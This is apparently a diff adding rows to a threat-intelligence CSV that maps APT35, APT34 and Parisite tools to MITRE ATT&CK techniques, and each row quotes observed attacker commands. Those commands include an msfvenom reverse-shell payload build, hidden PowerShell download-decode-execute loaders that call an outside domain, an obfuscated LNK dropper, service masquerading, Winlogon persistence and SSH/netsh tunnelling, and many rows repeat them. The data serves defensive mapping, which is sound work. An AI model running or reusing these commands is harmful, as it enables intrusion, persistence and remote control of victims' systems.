+msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
+APT35,Windows Service Configuration Tool,defense-evasion,T1036.004,Masquerade Task or Service,"sc create Microsoft Exchange Services Health binpath= C:\\ProgramData\\Microsoft\\DRMS\\Microsoft Exchange Services Health.exe start= auto 
+sc start Microsoft Exchange Services Health
+sc create Exchange Agent Diagnostic Services binpath= C:\\ProgramData\\Microsoft\\Diagnostic\\Exchange Agent Diagnostic Services.exe start= auto 
+sc start Microsoft Exchange Services Health"
+APT35,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,"sc create Microsoft Exchange Services Health binpath= C:\\ProgramData\\Microsoft\\DRMS\\Microsoft Exchange Services Health.exe start= auto 
+sc start Microsoft Exchange Services Health
+sc create Exchange Agent Diagnostic Services binpath= C:\\ProgramData\\Microsoft\\Diagnostic\\Exchange Agent Diagnostic Services.exe start= auto 
+sc start Microsoft Exchange Services Health"
+APT35,WMIC,execution,T1047,Windows Management Instrumentation,wmic /node:127.0.0.1 process call create c:\\windows\\temp\\Certificates\\envisa.exe 88.80.148[.]162 -P 443 -C -R 127.0.0.1:40455:192.168.10.10:1433 -l <user> -pw <password>”
+APT35,PowerShell,execution,T1059.001,PowerShell,"%WINDIR%\temp\Certificates\envisa.exe
+%ALLUSERSPROFILE%\Microsoft\DRMS\JavaUpdateServices.exe
+%ALLUSERSPROFILE%\Microsoft\Diagnostic\MicrosoftExchangeServicesLog.exe
+%ALLUSERSPROFILE%\Microsoft\Diagnostic\MicrosoftExchangeDiagnosticServices.exe"
+APT35,PowerShell,execution,T1059.001,PowerShell,"/c powershell -WindowStyle hidden  $path = '%TEMP%\s6b4.0.pdf'; $wc = New-Object System.Net.WebClient; $bytes = $wc.DownloadData('https://deersharpfork.info/dw85fgxtvzq/download/i/34624051816246d4a1a7f225d966d139/7e58169ee59d46e7a2be023e728c6205.jpg'); sc $path ([byte[]]($bytes)) -Encoding Byte; & %TEMP%\s6b4.0.pdf
+/c powershell -WindowStyle hidden  $path = '%TEMP%\s6b4.1.exe'; $wc = New-Object System.Net.WebClient; $bytes = $wc.DownloadData('https://deersharpfork.info/dw85fgxtvzq/download/f/bb14611f7aae441fb78f2ca919b800b5/7e58169ee59d46e7a2be023e728c6205'); for($i = 0; $i -lt $bytes.count; $i++) {$bytes[$i] = $bytes[$i] -bxor 0x25 }; sc $path ([byte[]]($bytes)) -Encoding Byte; ^& %TEMP%\s6b4.1.exe;"
+APT35,Reg,defense-evasion,T1112,Modify Registry,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
+{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
+APT35,Reg,discovery,T1083,File and Directory Discovery,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
+{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
+APT35,WMIC,defense-evasion,T1112,Modify Registry,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
+{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
+APT35,WMIC,discovery,T1083,File and Directory Discovery,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
+{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
+APT35,WMIC,discovery,T1069.002,Domain Groups,wmic computersystem get domain
+APT34,PowerShell,execution,T1059.001,PowerShell,powershell.exe -File %APPDATA%\Local\Microsoft\InputPersonalization\TrainedDataStore.ps1
+APT35,findstr,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,Console Windows Host,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,cd,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,mkdir,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,start,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,rm,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,copy,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,dir,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,Cmd,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+APT35,Regsvr32,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
+Parisite,ipconfig,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ipconfig,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ipconfig,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ipconfig,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ipconfig,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ipconfig,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ssh,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ssh,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ssh,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ssh,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ssh,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,ssh,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,netstat,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,netstat,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,netstat,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,netstat,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,netstat,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,netstat,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,findstr,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,findstr,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,findstr,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,findstr,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,findstr,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,findstr,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Netsh,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
